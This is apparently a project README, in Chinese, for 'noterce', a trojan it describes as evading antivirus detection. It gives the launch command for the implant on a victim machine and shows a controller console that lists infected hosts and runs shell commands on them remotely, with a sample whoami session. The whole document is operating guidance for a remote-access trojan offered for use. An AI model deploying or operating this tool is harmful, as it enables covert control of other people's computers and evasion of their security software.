## noterce
一种另辟蹊径的免杀执行系统命令的木马

## 使用
client为控制端
server为被控制端

1. 在被控端运行被控端
- 被控端运行命令 key参数制定notekey admin参数执行主控 ：
./server --key notekey --admin ocis

2. 控制端刷新在线主机列表


```shell
0:主机名:[penetration]  note地址:[BpLnfgDsc3WD9F3qNfHK6a95jjJkwz]       notekey地址:[zhu1234554321zhu]


1.获取在线主机列表(不一定全)
2.执行主机命令(需要等待30秒)
3.删除主机(可能主机被控木马已被杀掉,列表不会自动删除,需要手动删除)
```


3.控制端执行命令
```shell
1.获取在线主机列表(不一定全)
2.执行主机命令(需要等待30秒)
3.删除主机(可能主机被控木马已被杀掉,列表不会自动删除,需要手动删除)

2
请输入note地址:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
请输入notekey:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
请输入shell命令:whoami
请等待30秒
jpass
```


```shell
1.获取在线主机列表(不一定全)
2.执行主机命令(需要等待30秒)
3.删除主机(可能主机被控木马已被杀掉,列表不会自动删除,需要手动删除)

2
请输入note地址:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
请输入notekey:BpLnfgDsc3WD9F3qNfHK6a95jjJkwz
请输入shell命令:whoami
请等待30秒
jpass
```

